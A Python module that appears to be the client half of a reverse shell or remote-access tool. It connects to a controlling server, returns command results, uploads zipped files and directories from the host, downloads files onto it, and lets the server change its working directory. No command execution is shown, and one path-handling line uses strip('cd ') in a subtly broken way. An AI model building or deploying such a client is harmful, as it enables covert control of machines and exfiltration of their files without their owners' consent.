import socket
import zipfile
import os

DELIMETER = "<END_OF_RESULTS>"
CHUNK_SIZE = 1024 * 4

class ClientConnection:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self, server_ip, server_port):
        self.sock.connect((server_ip, server_port))
        self.server_ip = server_ip
        self.server_port = server_port

    def receiveData(self):
        self.data_in_bytes = self.sock.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data

    def sendData(self, data):
        #self.data_in_bytes = bytes(data, "utf-8")
        self.data_in_bytes = data.encode("utf-8")
        self.sock.send(self.data_in_bytes)
    
    def sendCommandResult(self, command_result):
        data2send = command_result + DELIMETER
        data2send_bytes = data2send.encode()
        self.sock.sendall(data2send_bytes)

    def receiveFile(self, filename):
        # Todo: decrypt and decode
        print("[+] Receiving file")
        with open(filename, "wb") as file:
            while True:
                chunk = self.sock.recv(CHUNK_SIZE)
                if chunk.endswith(DELIMETER.encode()):
                    chunk = chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)

        print("[+] Completed file transfer")

    def sendFile(self, toDownload):
        print("[+] Sending file: ", toDownload)
        if os.path.isdir(toDownload):
            zipped_name = toDownload + ".zip"
            zipf = zipfile.ZipFile(zipped_name, "w", zipfile.ZIP_DEFLATED)
            for root, dirs, files in os.walk(toDownload):
                for file in files:
                    zipf.write(os.path.join(root, file))
            zipf.close()
            
        else:
            # Strip the extension
            basename = os.path.basename(toDownload)
            name, ext = os.path.splitext(basename)
            toZip = name + ".zip"
            zipf = zipfile.ZipFile(toZip, "w", zipfile.ZIP_DEFLATED)
            zipf.write(basename)
            zipf.close()
            zipped_name = toZip

        zip_content = b''
        with open(zipped_name,"rb") as file:
            zip_content = file.read()
            file.close()

        self.sendData(zipped_name)
        zip_with_delimeter = zip_content + DELIMETER.encode()
        self.sock.send(zip_with_delimeter)

        os.remove(zipped_name)

    def changeDirectory(self):
        print("[+] Changing directory")
        pwd = os.getcwd()
        self.sendData(pwd)
        while True:
            user_command = self.receiveData()
            if user_command == "stop":
                break
            if user_command.startswith("cd "):
                path2move = user_command.strip("cd ")

                if os.path.exists(path2move):
                    os.chdir(path2move)
                    pwd = os.getcwd()
                    self.sendData(pwd)
                else:
                    self.sendData(os.getcwd())
            else:
                self.sendData(os.getcwd())
        
    def close(self):
        self.sock.close()